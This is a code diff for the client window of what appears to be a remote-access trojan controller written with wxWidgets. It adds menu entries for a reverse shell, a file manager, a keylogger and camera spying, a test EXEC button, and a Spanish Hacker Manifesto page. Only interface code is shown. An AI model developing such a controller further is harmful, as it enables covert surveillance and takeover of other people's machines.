@@ -1,16 +1,20 @@
 #include "frame_client.hpp"
 #include "server.hpp"
+#include "misc.hpp"
 
 extern Servidor* p_Servidor;
 extern std::mutex vector_mutex;
 
-FrameCliente::FrameCliente(std::string strID)
-    : wxFrame(nullptr, wxID_ANY, ":v")
+FrameCliente::FrameCliente(std::string strID, int iID)
+    : wxFrame(nullptr, iID, ":v")
 {
+
+    std::vector<std::string> vcOut = strSplit(strID, '/', 1);
+    this->strClienteID = vcOut[0];
 
     std::unique_lock<std::mutex> lock(vector_mutex);
     for (auto iter = p_Servidor->vc_Clientes.begin(); iter != p_Servidor->vc_Clientes.end();) {
-        if (iter->_id == strID) {
+        if (iter->_id == this->strClienteID) {
             iter->_isBusy = true;
             break;
         }
@@ -18,7 +22,7 @@ FrameCliente::FrameCliente(std::string strID)
     }
     lock.unlock();
 
-    this->strClienteID = strID;
+    
     wxString strTitle = "[";
     strTitle.append(strID.c_str());
     strTitle.append("] - Admin");
@@ -35,31 +39,48 @@ FrameCliente::FrameCliente(std::string strID)
 
     wxTreeItemId rootC = this->m_tree->AddRoot(wxT("CLI"));
     
-    wxTreeItemId rootAdmin = this->m_tree->AppendItem(rootC, wxT("[ADMIN]"));
-    wxTreeItemId rootSurveilance = this->m_tree->AppendItem(rootC, wxT("[VIGILANCIA]"));
+    wxTreeItemId rootAdmin = this->m_tree->AppendItem(rootC, wxT("[Admin]"));
+    wxTreeItemId rootSurveilance = this->m_tree->AppendItem(rootC, wxT("[Spy]"));
+    wxTreeItemId rootMisc = this->m_tree->AppendItem(rootC, wxT("[Misc]"));
 
     this->m_tree->AppendItem(rootAdmin, wxT("Reverse Shell"));
-    this->m_tree->AppendItem(rootAdmin, wxT("File Manager"));
+    this->m_tree->AppendItem(rootAdmin, wxT("Administrador de archivos"));
 
     this->m_tree->AppendItem(rootSurveilance, wxT("Keylogger"));
     this->m_tree->AppendItem(rootSurveilance, wxT("Camara"));
     
+    this->m_tree->AppendItem(rootMisc, wxT("Testing"));
+
     this->m_tree->p_Notebook = new wxAuiNotebook(pnl_Right, wxID_ANY, wxDefaultPosition, wxSize(600, 450),
         wxAUI_NB_CLOSE_ON_ACTIVE_TAB | wxAUI_NB_DEFAULT_STYLE | wxAUI_NB_TAB_EXTERNAL_MOVE | wxNO_BORDER);
 
-    this->m_tree->p_Notebook->Freeze();
-    this->m_tree->p_Notebook->AddPage(new wxTextCtrl(this->m_tree->p_Notebook, wxID_ANY, "Some text",
-        wxDefaultPosition, wxDefaultSize, wxTE_MULTILINE | wxNO_BORDER), "wxTextCtrl 1", false);
-    this->m_tree->p_Notebook->Thaw();
+    wxHtmlWindow* html = new wxHtmlWindow(this->m_tree->p_Notebook, wxID_ANY, wxDefaultPosition, wxSize(200, 200));
+    html->SetBackgroundColour(wxColor(0, 0, 255));
+    wxString htmlsource = "<center><p>Este es mi mundo. El mundo del electrón y el interruptor, la belleza del baudio. Hacemos uso de un servicio existente, sin pagar por él, que podría ser asquerosamen- te barato si no estuviera gestionado por explotadores glotones, y ustedes nos llaman criminales.<br>\
+Nosotros exploramos y nos llaman criminales.<br>\
+Buscamos el conocimiento y nos llaman criminales.<br>\
+No tenemos razas, nacionalidades, prejuicios religiosos y nos llaman criminales.<br>\
+Ustedes construyen bombas atómicas, delcaran guerras, asesinan, defraudan, y nos mienten, y nos tratan de hacer creer que es por nuestro bien, todavía somos los criminales.<br>\
+Sí soy un criminal. Mi crimen es la curiosidad. Mi crimen es juzgar a la gente por lo que dice y piensa, no por lo que parece. Mi crimen es que soy más listo que tu, algo que no me puedes perdonar.<br>\
+Soy un hacker, y este es mi manifiesto.<br>\
+Me pueden detener a mí, pero no nos pueden detenernos a todos, al fin y al cabo todos somos iguales.\</p></center>";
+    html->SetPage(htmlsource);
+    html->SetSize(wxSize(200, 200));
 
+    this->m_tree->p_Notebook->Freeze();
+    this->m_tree->p_Notebook->AddPage(html, ":v", true);
+    this->m_tree->p_Notebook->Thaw();
+    
     wxBoxSizer* sizer = new wxBoxSizer(wxHORIZONTAL);
 
     sizer->Add(pnl_Left, 0, wxALL, 2);
     sizer->Add(pnl_Right, 1, wxALL, 1);
+    
 
     this->SetSizerAndFit(sizer);
 
-    SetClientSize(800, 600);
+    SetClientSize(800, 450);
+    SetSizeHints(820, 485, 820, 485);
     
     //this->btn_Test = new wxButton(pnl_Right, EnumIDS::ID_FrameClienteTest, "EXEC");
 
@@ -133,7 +154,19 @@ void MyTreeCtrl::OnItemActivated(wxTreeEvent& event) {
     //GetPageCount
     if (wStr[0] != '[' && isFound == false) {
         this->p_Notebook->Freeze();
-        this->p_Notebook->AddPage(new wxTextCtrl(this->p_Notebook, wxID_ANY, wStr, wxDefaultPosition, wxDefaultSize, wxNO_BORDER), wStr, true);
+
+        if (wStr == "Testing") {
+            this->p_Notebook->AddPage(new panelTest(this), wStr, true);
+        }
+        //this->p_Notebook->AddPage(new wxTextCtrl(this->p_Notebook, wxID_ANY, wStr, wxDefaultPosition, wxDefaultSize, wxNO_BORDER), wStr, true);
+        
         this->p_Notebook->Thaw();
     } 
+}
+
+
+//Modulos
+panelTest::panelTest(wxWindow* pParent) :
+    wxPanel(pParent) {
+    wxButton* btn_Test = new wxButton(this, EnumIDS::ID_FrameClienteTest, "EXEC");
 }
